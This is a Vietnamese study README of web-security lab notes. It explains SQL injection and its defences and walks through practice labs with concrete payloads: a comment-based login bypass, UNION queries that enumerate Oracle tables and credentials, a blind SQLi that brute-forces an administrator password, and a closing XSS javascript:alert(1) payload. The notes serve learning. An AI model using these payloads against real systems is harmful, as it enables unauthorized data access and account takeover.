# Vulnerability-labs

SQLi
- 1 lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện đối với csdl của nó. Nó thường cho phép kẻ tấn công thông thường chúng ko thể truy xuất được. Điều này có thể bao gồm dữ liệu thuộc về người dùng khác hoặc bất kỳ dữ liệu nào khác mà bản thân ứng dụng có thể truy cập. Có thể sửa xóa dl này, gây ra thay đổi liên tục đối với nội dung hoặc hành vi của ứng dụng

+ Tác động của một cuộc tấn công SQLi thành công?
- 1 cuộc tấn công thành SQLi thành công có thể dẫn đến việc truy cập trái phép vào dữ liệu nhạy cảm. 

Có rất nhiều lỗ hổng, các cuộc tấn công, kỹ thuật, phát sinh trong các tình huống khác nhau. Số ví dụ về SQLi phổ biến bao gồm:
- Retrieving hidden data (truy suất dữ liệu ẩn), nơi mình có thể thay đổi truy vấn SQL để trả về thêm kết quả. (SQL special characters)

+ Lấy dữ liệu từ bẳng dữ liệu: Có thể tận dụng SQLi để truy xuất dữ liệu từ các bẳng khác trong csdl. Được thực hiện bằng cách sử dụng UNION, cho phép bạn thực hiện 1 truy vấn SELECT bổ sung và nối các kq vào truy vấn ban đầu.
  - SQL i UNION attack: có thể sử dụng để truy xuất dữ liệu từ bảng khác trong csdl. 
  select a,b from table1 union select c,d from table2
  -> truy vấn sẽ trả về 1 tập hợp kết quả có 2 cột, chứa giá trị của cột a,b bang1 và cột c,d trong bảng2



- Subvering application logic: nơi bạn có thể thay đổi truy vấn để can thiệp vào logic của ứng dụng

- Union, nơi có thể truy xuất dữ liệu các bảng csdl khác nhau
+ Xem xét 1 ứng dụng cho phép người dùng đăng nhập với username và password . Nếu ng dùng gửi username anhphap và password là france, ứng dụng sẽ kiểm tra thông tin đăng nhập = cách thực hiện truy vấn SQL sau: select * from users where username = ‘anhphap’ and password=’france’ 

- Examining the database, nơi có thể truy xuất dữ liệu từ các bảng csdl khác nhau.

- Blind SQL injection, trong đó kết quả của truy vấn bạn kiểm soát không được trả về trong phản hồi của ứng dụng.


+ Ở đây người tấn công có thể đăng nhập với bất kì người dùng nào ko cần mật khẩu chỉ cần đơn giản bằng cách sử dụng chuỗi SQL ‘- - ‘ để xóa kiểm tra mật khẩu khỏi mệnh đề WHERE. Ví dụ gửi 1 username administrator’--‘ và 1 password trống kết quả truy vấn sẽ như sau 
Select * from users where username = ‘administrator’--‘ and password ‘’ 
Câu truy vấn trả về kết quả với username là administrator và đăng nhập thành công kẻ tấn công có thể sử dụng nó.
- Retrieving data from other database tables
+ Trong trường hợp nơi kết quả của truy vấn sql được trả về với phản hồi của ứng dụng, người tấn công có thể tận dụng lỗ hổng sqli để lấy dữ liệu từ các bảng khác trong cơ sở dữ liệu. Điều này được thực hiện = cách sử dụng từ khóa Union, cho phép bạn thực hiện truy vấn Select bổ sung và nối kết quả vào truy vấn ban đầu. 
- Examining the database
+ Sau khi xác định ban đầu về lỗ hổng sqli, nói chung là hữu ích để có được 1 số về cơ sở dữ liệu. Thông tin này có thể được mở rộng cho việc khai thác thêm. 
+ Read more: sqli cheat sheet or examining the db in sql injection attacks

- Blind sqli vulnerabilites (lỗ hổng mù)
+ Vấn đề ứng dụng ko trả về kết quả của truy vấn sql or chi tiết của vài csdl lỗi trong khi phản hồi. Lỗ hổng mù có thể vẫn bị khai thác để truy cập dữ liệu trái phép, nhưng các kỹ thuật liên quan thường phức tạp hơn và khó thực hiện hơn.
+ Nhiều kỹ thuật như tấn công Union không hieuejq ủa vì chúng dựa vào việc có thể xem kq truy vấn được chèn trong các phản hồi của ứng dụng. 

+ Khai thác blind sqli bằng cách kích hoạt các phản hồi có điều kiện.
    Sử dụng cookie theo dõi thu thập phân tích. Yêu cầu bao gồm tiêu đề Cookie như sau: Cookie: TrackingId = abxz
    Khi yêu cầu chức cookie TrackingId được xử lý, ứng dụng xác định xem đây có phải là ng dùng đã biết hay ko bằng cách sử dụng truy vấn SQL như sau: 
    

- How to dectect sqli vulnerabilities
+ Gửi ký tự trích dẫn duy nhất và tìm kiếm lỗi hoặc các điểm bất thường khác
+ Gửi 1 số cú pháp dành riêng cho sql đnáh giá giá trị cơ sở (ban đầu) của điểm nhập và 1 giá trị khác, đồng thời tìm kiếm sự khác biệt có hệ thông trong phản hồi ứng dụng kết quả.
+ Các cuộc tấn công xảy ra khi kẻ tấn công được gửi các đầu vào được tạo thủ công độc hại, khiến ứng dụng thực hiện một hành động không mong muốn.
+ Database giữ thông tin người dùng, khi attacker có thể truyền code vào được, lấy toàn bộ danh sách user, xóa data-table or bỏ thêm code vào

- Protecting against sqli
+ Parameterized Statements: Sử dụng đảm bảo dữ liệu truyền vào đã được đảm bảo, sẽ ko gây hại, bằng cách sử dụng prepared statements thay vì nối chuỗi trong truy vấn.
+ Object Relational Mapping:
+ Escaping inputs: mã hóa dữ liệu nhập vào: mấy cái ‘ , ‘’ lọc ra tránh gây hại cho sql
+ Principle of Least Privilege (quyền thấp nhất): chỉ cho quyền vừa đủ
+ Password Hashing: các ứng dụng nên lưu mk ng dùng dưới dạng mã băm mạnh, 1 chiều. Làm giảm nguy cơ bị người dùng đánh cắp thông tin đăng nhập hoặc mạo danh người dùng khác. 
LAB1: Where để truy suất dữ liệu ẩn.
-	Select * from products where category = ‘gifts’ and released = 1
Hiển thị tất cả các sp trong bất kì dnah mục nào , kể cả chưa phát hành 
Sử dụng ‘ or 1=1--

LAB2: Tấn công đăng nhập với tư cách là administrator user:
- Nhập sai tt -> invalid user/pw
- Nhập user: ‘ -> internal server error

LAB3: Xác định số cột được trả về bởi truy vấn (UNION) 
Để thực hiện một cuộc tấn công SQL injection UNION, bạn cần đảm bảo rằng cuộc tấn công của bạn đáp ứng hai yêu cầu này. Điều này thường liên quan đến việc tìm ra:
Có bao nhiêu cột đang được trả về từ truy vấn ban đầu?
Những cột nào được trả về từ truy vấn ban đầu thuộc loại dữ liệu phù hợp để giữ kết quả từ truy vấn được đưa vào?

Determining the number of column 
Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, tấn công Union để lấy dữ liệu từ bảng khác. Đầu tiên là xác định số cột được trả về bởi truy vấn.
-	Select ? from table union select null:
-	Select ? from table union select null, null, null--  
Finding a column containing textcvxf
‘ Union select ‘a’, null, null---
 ‘ Union select null, ‘a’ , null---		chưa đúng thì tiếp tục dịch chuyển 

Retrieving data from other tables
‘ union select ‘a’, ‘b’—
‘ union select username, password from user--

Xác định bảng csdl nào tồn tại và chúng chứa những cột nào. 
    select * from information_schema.tables

LAB 9: Listing the db contents on Oracle
- Determine which table contains the username and passwd
- Determine number of column (xác định số lượng cột cần thiết trong một cuộc tấn công Union sql i)
    + ' order by 1,2,3... --
- Find data type of column (suy ra số cột được trả về từ truy vấn)
    + ' union select 'a', 'b', null from dual--
- Output the list of table in the db
    + ' union select table_name, null from all_tables
    -> USERS_?
- Output the column names of the users table
    + ' union select column_name, null from all_tab_columns where table_name = "USERS_?"
    -> USERSNAME_?, PASSWORD_?
- Output the list username and password
    + 'union select USERSNAME_?, PASSWORD_? from USERS_?
    -> password: ....

- Retrieving multiple values within a single column (Truy xuất nhiều giá trị trong một côt): 
    ' UNION SELECT username || '~' || password FROM users--
|| là toán tử nối chuỗi trong oracle. 

Lab11: Blind SQLi với phản hồi có điều kiện, ứng dụng sử dụng cookie theo dỗi để phân tích truy vấn sql có chứa giá trị cookie đã gửi. 
    Kết quả truy vấn sql ko trả lại và ko có thông báo lỗi nào hiển thị. Tuy nhiên ứng dụng bao gồm thông báo "Welcome back" trong trang nếu trả về bất kỳ hàng nào.

Mục tiêu:
- Liệt kê password cua administrator
- Login administrator user 

Phan tich:
1. Xác định tham số la blind sqli
- trackingId= ' and 1=1--'
2. Xác định có bảng users 
- trackingId= ' and (select 'a' from users LIMIT 1)='a'--'
-> Bảng users tồn tại trong db
3. Xác định username administrator tồn tại trong db
- trackingId = ' and (select username from users where username='administrator')='administrator'--'
4. Liệt kê password voi username administrator
- and (select username from users where username='administrator' and LENGTH(passowrd)>1)='administrator'--'
Intruder check độ dài password -> 
-> số kí tự là: 20 
- and (select substring(password,1,1) from users where username='administrator')='a'--'
Add $ 'a' sử dụng payload type: Brute forcer
-> Kí tự đầu tiên : b
Attack type: Cluster Bomb
Add $ 'a', '1' sử dụng payload type: Brute forcer
buc49tw32naks4pwyxso





LAB: 
End goals: 
- Gửi comment dể gọi hàm Alert khi tên tác giả nhận xét được nhập vào

Phân tích:
- Post comment random in the "Website" input, sử dụng Burp Suite để đánh chặn yêu cầu -> send to Reapeater
- Lặp lại quy trình 1 lần nhưng thay thế đầu vào bằng payload để thêm URL JS gọi cảnh báo:
    javascript:alert(1)

